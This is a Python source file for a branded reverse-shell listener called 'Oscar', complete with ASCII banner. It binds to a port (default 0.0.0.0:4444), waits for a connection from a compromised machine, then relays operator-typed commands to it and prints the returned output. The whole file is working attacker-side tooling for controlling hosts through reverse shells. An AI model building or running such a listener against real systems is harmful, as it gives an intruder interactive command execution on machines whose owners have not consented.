#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import sys
import time
import os
import platform
import subprocess


def oscar_banner():
    """Display Oscar banner"""
    os.system('clear' if platform.system() != 'Windows' else 'cls')
    
    banner = """
\033[91m
    ▒█████       ██████     ▄████▄      ▄▄▄          ██▀███   
  ▒██▒  ██▒   ▒██    ▒    ▒██▀ ▀█     ▒████▄       ▓██ ▒ ██▒
  ▒██░  ██▒   ░ ▓██▄      ▒▓█    ▄    ▒██  ▀█▄     ▓██ ░▄█ ▒
  ▒██   ██░     ▒   ██▒   ▒▓▓▄ ▄██▒   ░██▄▄▄▄██    ▒██▀▀█▄        
  ░ ████▓▒░   ▒██████▒▒   ▒ ▓███▀ ░    ▓█   ▓██▒   ░██▓ ▒██▒
  ░ ▒░▒░▒░    ▒ ▒▓▒ ▒ ░   ░ ░▒ ▒  ░    ▒▒   ▓▒█░   ░ ▒▓ ░▒▓░      By Abraham ...
    ░ ▒ ▒░    ░ ░▒  ░ ░     ░  ▒        ▒   ▒▒ ░     ░▒ ░ ▒░
  ░ ░ ░ ▒     ░  ░  ░     ░             ░   ▒        ░░   ░ 
      ░ ░           ░     ░ ░               ░  ░      ░     
                          ░                                 
\033[0m
"""
    print(banner)



class Colors:
    RED = '\033[91m'
    YELLOW = '\033[93m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'


class ReverseShellListener:
    
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.socket = None
        self.client = None
        self.client_addr = None
        self.running = True
        
    def start(self):
        oscar_banner()
        
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
            
            print(f"{Colors.WHITE}[{Colors.RED}+{Colors.WHITE}] LISTENING ON {Colors.YELLOW}{self.host}:{self.port}")
            print(f"{Colors.WHITE}[{Colors.YELLOW}*{Colors.WHITE}] AWAITING INCOMING CONNECTION...")
            print()
            
            self.client, self.client_addr = self.socket.accept()
            
            print(f"{Colors.WHITE}[{Colors.RED}+{Colors.WHITE}] CONNECTION ESTABLISHED")
            print(f"{Colors.WHITE}    FROM {Colors.YELLOW}{self.client_addr[0]}{Colors.WHITE} ON PORT {Colors.YELLOW}{self.client_addr[1]}")
            print()
            
            self.shell_session()
            
        except KeyboardInterrupt:
            print(f"\n{Colors.WHITE}[{Colors.YELLOW}!{Colors.WHITE}] INTERRUPTED BY USER")
        except Exception as e:
            print(f"{Colors.WHITE}[{Colors.RED}-{Colors.WHITE}] ERROR: {e}")
        finally:
            self.cleanup()
    

    
    def shell_session(self):
        print(f"{Colors.WHITE}[{Colors.YELLOW}*{Colors.WHITE}] SHELL SESSION ACTIVE")
        print(f"{Colors.WHITE}[{Colors.YELLOW}*{Colors.WHITE}] TYPE '{Colors.RED}exit{Colors.WHITE}' TO TERMINATE")
        print()
        
        while self.running:
            try:
                prompt = f"{Colors.RED}┌─{Colors.WHITE}shell{Colors.RED}@{Colors.YELLOW}{self.client_addr[0]}{Colors.RED}\n└─{Colors.WHITE}$ {Colors.RESET}"
                cmd = input(prompt)
                
                if not cmd:
                    continue
                
                if cmd.lower() in ['exit', 'quit']:
                    print(f"{Colors.WHITE}[{Colors.YELLOW}*{Colors.WHITE}] CLOSING CONNECTION...")
                    break
                
                if cmd.lower() == 'clear':
                    os.system('clear' if platform.system() != 'Windows' else 'cls')
                    oscar_banner()
                    continue
                
                self.client.send((cmd + '\n').encode('utf-8'))
                
                output = self.receive_output()
                if output:
                    print(output)
                else:
                    print(f"{Colors.WHITE}[{Colors.YELLOW}!{Colors.WHITE}] NO OUTPUT RECEIVED")
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.WHITE}[{Colors.YELLOW}!{Colors.WHITE}] INTERRUPTED")
                break
            except BrokenPipeError:
                print(f"{Colors.WHITE}[{Colors.RED}-{Colors.WHITE}] CONNECTION LOST")
                break
            except Exception as e:
                print(f"{Colors.WHITE}[{Colors.RED}-{Colors.WHITE}] ERROR: {e}")
                break
    
    def receive_output(self):
        try:
            self.client.settimeout(0.5)
            
            output = ""
            while True:
                try:
                    data = self.client.recv(4096).decode('utf-8', errors='ignore')
                    if not data:
                        break
                    output += data
                except socket.timeout:
                    break
                except:
                    break
            
            self.client.settimeout(None)
            return output
            
        except Exception as e:
            return None
    
    def cleanup(self):
        print(f"{Colors.WHITE}[{Colors.YELLOW}*{Colors.WHITE}] CLEANING UP...")
        
        if self.client:
            try:
                self.client.close()
            except:
                pass
        
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        
        print(f"{Colors.WHITE}[{Colors.RED}+{Colors.WHITE}] CLEANUP COMPLETE")


def main():
    if len(sys.argv) < 2:
        print(f"{Colors.RED}USAGE: {sys.argv[0]} <IP> <PORT>")
        print(f"{Colors.WHITE}EXAMPLE: {sys.argv[0]} 0.0.0.0 4444")
        print()
        print(f"{Colors.WHITE}OR WITH DEFAULTS:")
        print(f"  {sys.argv[0]} --default")
        sys.exit(1)
    
    if sys.argv[1] == '--default':
        host = '0.0.0.0'
        port = 4444
    else:
        if len(sys.argv) < 3:
            print(f"{Colors.WHITE}[{Colors.RED}-{Colors.WHITE}] SPECIFY BOTH IP AND PORT")
            sys.exit(1)
        host = sys.argv[1]
        port = int(sys.argv[2])
    
    listener = ReverseShellListener(host, port)
    listener.start()


if __name__ == "__main__":
    main()